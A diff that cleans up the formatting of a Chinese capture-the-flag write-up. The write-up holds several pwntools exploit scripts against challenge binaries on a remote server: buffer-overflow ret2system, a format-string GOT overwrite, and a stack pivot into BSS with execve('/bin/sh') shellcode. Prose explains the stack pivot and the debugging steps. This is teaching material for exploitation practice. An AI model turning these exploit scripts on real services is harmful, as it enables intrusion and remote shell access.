@@ -11,88 +11,14 @@ by Maple
 
 
 ```
-
-from
-
-pwn
-
-import
-
-*
-
+from pwn import *
 #p = process('./pwn')
-
-p
-
-=
-
-remote
-(
-'1.95.36.136'
-,
-2055
-)
-
-elf
-
-=
-
-ELF
-(
-'./pwn'
-)
-
-sys
-
-=
-
-elf
-.
-sym
-[
-'system'
-]
-
-payload
-
-=
-
-b
-'b'
-*
-(
-0x2c
-+
-4
-)
-+
-p32
-(
-sys
-)
-+
-p32
-(
-0
-)
-+
-p32
-(
-0x0804857c
-)
-
-p
-.
-sendline
-(
-payload
-)
-
-p
-.
-interactive
-()
-
+p = remote('1.95.36.136',2055)
+elf = ELF('./pwn')
+sys = elf.sym['system']
+payload = b'b'*(0x2c+4)+p32(sys)+p32(0)+p32(0x0804857c)
+p.sendline(payload)
+p.interactive()
 ```
 
 
@@ -109,145 +35,26 @@ interactive
 所以可以将`passwd`迁移到`rbp+0x4`的位置，这样通过`scanf`读入寻址，刚好读到`rbp`上
 
 
-```
-
-from
-
-pwn
-
-import
-
-*
-
-from
-
-LibcSearcher
-
-import
-
-LibcSearcher
-
-from
-
-ctypes
-
-import
-
-*
-
-context
-(
-os
-=
-'linux'
-,
-
-arch
-=
-'amd64'
-,
-log_level
-
-=
-
-'debug'
-)
-
-context
-.
-terminal
-
-=
-
-'wt.exe -d . wsl.exe -d Ubuntu'
-.
-split
-()
-
-elf
-
-=
-
-ELF
-(
-"./pwn"
-)
-
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
 #libc = ELF("./libc.so.6")
-
 #p = process('./pwn')
+p = remote('1.95.36.136',2138)
+def dbg():
+    gdb.attach(p)
+    pause()
 
-p
+passwd_addr = 0x4033CC
+payload = b'b'*0x50+p64(passwd_addr+0x4)
+p.sendline(payload)
 
-=
-
-remote
-(
-'1.95.36.136'
-,
-2138
-)
-
-def
-
-dbg
-():
-
-
-gdb
-.
-attach
-(
-p
-)
-
-
-pause
-()
-
-passwd_addr
-
-=
-
-0x4033CC
-
-payload
-
-=
-
-b
-'b'
-*
-0x50
-+
-p64
-(
-passwd_addr
-+
-0x4
-)
-
-p
-.
-sendline
-(
-payload
-)
-
-p
-.
-sendlineafter
-(
-"input1:"
-,
-"4660"
-)
-
-p
-.
-interactive
-()
-
+p.sendlineafter("input1:","4660")
+p.interactive()
 ```
 
 有些不理解？我们调试看看
@@ -290,136 +97,21 @@ interactive
 **格式化字符串plt表劫持got表**
 
 
-```
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='i386',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+p = remote('1.95.36.136',2054)
 
-from
-
-pwn
-
-import
-
-*
-
-from
-
-LibcSearcher
-
-import
-
-LibcSearcher
-
-from
-
-ctypes
-
-import
-
-*
-
-context
-(
-os
-=
-'linux'
-,
-
-arch
-=
-'i386'
-,
-log_level
-
-=
-
-'debug'
-)
-
-context
-.
-terminal
-
-=
-
-'wt.exe -d . wsl.exe -d Ubuntu'
-.
-split
-()
-
-elf
-
-=
-
-ELF
-(
-"./pwn"
-)
-
-p
-
-=
-
-remote
-(
-'1.95.36.136'
-,
-2054
-)
-
-printf_got
-
-=
-
-elf
-.
-got
-[
-'printf'
-]
-
-system_plt
-
-=
-
-elf
-.
-plt
-[
-'system'
-]
-
-payload
-
-=
-
-fmtstr_payload
-(
-7
-,{
-printf_got
-:
-system_plt
-})
-
-p
-.
-sendline
-(
-b
-'s'
-)
-
-p
-.
-sendline
-(
-payload
-)
-
-p
-.
-interactive
-()
-
+printf_got = elf.got['printf']
+system_plt = elf.plt['system']
+payload = fmtstr_payload(7,{printf_got:system_plt})
+p.sendline(b's')
+p.sendline(payload)
+p.interactive()
 ```
 
 
@@ -468,185 +160,34 @@ interactive
 
 
 ```
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
 
-from
-
-pwn
-
-import
-
-*
-
-from
-
-LibcSearcher
-
-import
-
-LibcSearcher
-
-from
-
-ctypes
-
-import
-
-*
-
-context
-(
-os
-=
-'linux'
-,
-
-arch
-=
-'amd64'
-,
-log_level
-
-=
-
-'debug'
-)
-
-context
-.
-terminal
-
-=
-
-'wt.exe -d . wsl.exe -d Ubuntu'
-.
-split
-()
-
-elf
-
-=
-
-ELF
-(
-"./pwn"
-)
-
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
 #libc = ELF("./libc.so.6")
-
-p
-
-=
-
-process
-(
-'./pwn'
-)
-
+p = process('./pwn')
 #gdb.attach(p)
 
-bss_addr
+bss_addr = 0x4040A0
+leave_ret = 0x401338
+readbss = 0x401321
+jmp_rsp = 0x401342
+sh_addr = 0x40201d
+payload = b'b'*0x8+p64(bss_addr)+p64(readbss)+p64(leave_ret)
 
-=
+p.send(payload)
 
-0x4040A0
+shellcode = asm("nop;")
+shellcode+=asm("mov al,0x3b;mov esi,edi;mov edi,0x40201d;mov edx,esi;syscall;")
+shellcode+=asm("nop;nop")
+shellcode+=p64(jmp_rsp)
 
-leave_ret
+p.sendline(shellcode)
 
-=
-
-0x401338
-
-readbss
-
-=
-
-0x401321
-
-jmp_rsp
-
-=
-
-0x401342
-
-sh_addr
-
-=
-
-0x40201d
-
-payload
-
-=
-
-b
-'b'
-*
-0x8
-+
-p64
-(
-bss_addr
-)
-+
-p64
-(
-readbss
-)
-+
-p64
-(
-leave_ret
-)
-
-p
-.
-send
-(
-payload
-)
-
-shellcode
-
-=
-
-asm
-(
-"nop;"
-)
-
-shellcode
-+=
-asm
-(
-"mov al,0x3b;mov esi,edi;mov edi,0x40201d;mov edx,esi;syscall;"
-)
-
-shellcode
-+=
-asm
-(
-"nop;nop"
-)
-
-shellcode
-+=
-p64
-(
-jmp_rsp
-)
-
-p
-.
-sendline
-(
-shellcode
-)
-
-p
-.
-interactive
-()
-
+p.interactive()
 ```
 
 题目直接给我们说BSS段上可以运行`/bin/sh`，所以应该是需要一步栈迁移的，分析一下
@@ -655,47 +196,14 @@ interactive
 ### 栈迁移部分
 
 
-```
-
-ssize_t
-
-yichu
-()
-
+```c
+ssize_t yichu()
 {
+  char buf[8]; // [rsp+8h] [rbp-8h] BYREF
 
-
-char
-
-buf
-[
-8
-];
-
-// [rsp+8h] [rbp-8h] BYREF
-
-
-puts
-(
-asc_402028
-);
-
-
-return
-
-read
-(
-0
-,
-
-buf
-,
-
-0x20uLL
-);
-
+  puts(asc_402028);
+  return read(0, buf, 0x20uLL);
 }
-
 ```
 
 - buf距离栈底仅8字节，但`read`可读入0x20字节，可以覆盖`ebp`以及后面的一部分，所以我们直接让`bss`段的地址覆盖
@@ -725,67 +233,13 @@ buf
 >
 >
 
-```
-
-buf
-
-=
-
-byte
-
-ptr
-
--8
-
-lea
-
-rax
-,
-
-[
-rbp
-+
-buf
-]
-
-mov
-
-edx
-,
-
-20
-h
-
-;
-
-nbytes
-
-mov
-
-rsi
-,
-
-rax
-
-;
-
-buf
-
-mov
-
-edi
-,
-
-0
-
-;
-
-fd
-
-call
-
-_read
-
+```asm
+buf             = byte ptr -8
+lea     rax, [rbp+buf]
+mov     edx, 20h      ; nbytes
+mov     rsi, rax        ; buf
+mov     edi, 0          ; fd
+call    _read
 ```
 
 >
@@ -811,15 +265,13 @@ _read
 那么可以先写出来可以执行的汇编
 
 
-```
-
+```asm
 mov al, 0x3b        ;   设置系统调用号，0x3b对应execve(al为rax的字节型)
 mov esi, edi        ;   将edi赋给esi，此时edi=esi=0
 mov edi, 0x40201d   ;   将0x40201d赋给edi，此时edi=0x40201d(/bin/sh的地址)
 mov edx, esi        ;   将esi赋给edx，此时esi=0
 syscall             ;   调用syscall
 ;   syscall([al]0x3b)->execve([rdi]0x40201d, [rsi]NULL, [rds]NULL)
-
 ```
 
 因此实现了shellcode的写入。但是执行之后没法getshell，继续调试看看
@@ -834,31 +286,11 @@ syscall             ;   调用syscall
 发现还有一个叫reg的函数，看一下
 
 
-```
-
-push
-
-rbp
-
-mov
-
-rbp
-,
-
-rsp
-
-sub
-
-rsp
-,
-
-17
-h
-
-jmp
-
-rsp
-
+```asm
+push    rbp
+mov     rbp, rsp
+sub     rsp, 17h
+jmp     rsp
 ```
 
 *省流：让rsp指向rbp减0x17处*
